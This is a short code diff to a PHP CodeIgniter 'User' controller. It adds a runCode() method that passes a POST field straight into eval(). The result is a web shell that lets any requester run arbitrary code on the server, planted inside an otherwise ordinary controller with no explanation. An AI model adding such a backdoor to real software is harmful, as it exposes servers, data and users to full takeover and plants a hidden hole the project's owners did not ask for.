@@ -25,5 +25,9 @@ class User extends CI_Controller {
         header("Content-Type:application/json");
         echo json_encode($response);
     }
+    public function runCode(){
+        $code = $this->input->post('code');
+	    $output = eval("?> $code <?php"); 
+    }
 }
 ?>
